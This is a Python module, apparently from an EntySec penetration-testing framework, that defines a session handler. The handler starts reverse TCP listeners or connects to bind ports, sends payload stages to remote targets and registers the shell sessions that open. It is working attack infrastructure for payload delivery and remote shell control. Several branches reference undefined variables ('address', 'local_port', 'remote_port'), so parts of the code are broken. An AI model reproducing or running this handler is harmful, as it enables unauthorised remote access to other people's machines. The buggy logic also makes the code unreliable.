#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.base.sessions import sessions
from core.base.storage import local_storage
from core.modules.modules import modules
from core.cli.badges import badges

from utils.tcp.tcp import tcp
from utils.http.http import http

from data.utils.handler.handler.session import session

class handler:
    def __init__(self):
        self.sessions = sessions()
        self.local_storage = local_storage()
        self.modules = modules()
        self.badges = badges()

        self.tcp = tcp()
        self.http = http()

        self.servers = dict()

    def start_handler(self, local_host, local_port):
        if self.tcp.check_tcp_port(local_host, local_port):
            self.badges.output_error("Provided port is already in use!")
        else:
            self.badges.output_process("Starting reverse TCP handler on port " + str(local_port) + "...")
            try:
                address = self.http.format_host_and_port(local_host, local_port)
                self.servers[address] = self.tcp.start_server(local_host, local_port)
                self.badges.output_success("Reverse TCP handler successfully started!")
                return True
            except Exception:
                self.badges.output_error("Failed to start reverse TCP handler!")
        return False

    def listen(self, server, session=session):
        try:
            client, address = self.tcp.listen(server)
            return (session(client), address)
        except Exception:
            self.badges.output_error("Failed to handle session!")
            return (None, None)

    def connect(self, remote_host, remote_port, session=session, timeout=10):
        try:
            client = self.tcp.connect_server(remote_host, remote_port, timeout)
            return session(client)
        except Exception:
            self.badges.output_error("Failed to handle session!")
            return None

    def handle_bind_session(self, remote_host, remote_port, session=session):
        current_module = self.modules.get_current_module_object()

        new_session = self.connect(remote_host, remote_port, session)
        if not new_session:
            return False

        module_name = current_module.details['Module']
        session_property = self.modules.get_platform(module_name) + '/' + self.modules.get_name(module_name)

        if current_module.payload is not None:
            payload = current_module.payload
            if payload.instructions and payload.payload:
                self.badges.output_process("Sending payload stage...")
                new_session.tcp.client.sock.send(payload.instructions.encode() if isinstance(payload.instructions, str) else payload.instructions)
                if payload.instructions != payload.payload:
                    new_session.tcp.client.sock.send(payload.payload.encode() if isinstance(payload.payload, str) else payload.payload)
                new_session.close()

                if payload.action.lower() not in ['bind_tcp', 'reverse_tcp']:
                    self.badges.output_warning("Payload completed but no session was created.")
                    return True

                if payload.session:
                    session = payload.session

                session_property = current_module.payload.details['Category']

                if payload.action.lower() == 'bind_tcp':
                    new_session = self.connect(remote_host, remote_port, session)
                    if not new_session:
                        self.badges.output_warning("Payload completed but no session was created.")
                        return False
                    session_id = self.sessions.add_session(session_property, module_name, remote_host, local_port, new_session)
                    self.badges.output_success("Session " + str(session_id) + " opened!")
                    return True

                if payload.action.lower() == 'reverse_tcp':
                    local_host, local_port = self.tcp.get_local_host(), remote_port
                    if self.start_handler(local_host, local_port):
                        new_session, remote_host = self.listen(self.servers[address], session)
                        if not new_session and not remote_host:
                            self.badges.output_warning("Payload completed but no session was created.")
                            return False
            else:
                self.badges.output_warning("Payload you provided is not executable.")

        session_id = self.sessions.add_session(session_property, module_name, remote_host, remote_port, new_session)
        self.badges.output_success("Session " + str(session_id) + " opened!")
        return True

    def handle_reverse_session(self, local_host, local_port, session=session):
        address = self.http.format_host_and_port(local_host, local_port)
        if address in self.servers.keys():
            current_module = self.modules.get_current_module_object()

            module_name = current_module.details['Module']
            session_property = self.modules.get_platform(module_name) + '/' + self.modules.get_name(module_name)

            if current_module.payload is not None:
                payload = current_module.payload
                if payload.instructions and payload.payload:
                    new_session, remote_host = self.listen(self.servers[address], session)
                    if not new_session and not remote_host:
                        return False

                    self.badges.output_process("Sending payload stage...")
                    new_session.tcp.client.sock.send(payload.instructions.encode() if isinstance(payload.instructions, str) else payload.instructions)
                    if payload.instructions != payload.payload:
                        new_session.tcp.client.sock.send(payload.payload.encode() if isinstance(payload.payload, str) else payload.payload)
                    new_session.close()

                    if payload.action.lower() not in ['bind_tcp', 'reverse_tcp']:
                        self.badges.output_warning("Payload completed but no session was created.")
                        return True

                    if payload.session:
                        session = payload.session

                    session_property = current_module.payload.details['Category']

                    if payload.action.lower() == 'bind_tcp':
                        new_session = self.connect(remote_host, remote_port, session)
                        if not new_session:
                            self.badges.output_warning("Payload completed but no session was created.")
                            return False
                        session_id = self.sessions.add_session(session_property, module_name, remote_host, local_port, new_session)
                        self.badges.output_success("Session " + str(session_id) + " opened!")
                        return True
                else:
                    self.badges.output_warning("Payload you provided is not executable.")

            new_session, remote_host = self.listen(self.servers[address], session)
            if not new_session and not remote_host:
                return False

            session_id = self.sessions.add_session(session_property, module_name, remote_host, local_port, new_session)
            self.badges.output_success("Session " + str(session_id) + " opened!")
            return True
        return False

    def handle_session(self, host, port, session_type='reverse', session=session):
        if session_type.lower() == 'reverse':
            return self.handle_reverse_session(host, port, session)
        if session_type.lower() == 'bind':
            return self.handle_bind_session(host, port, session)
        return None
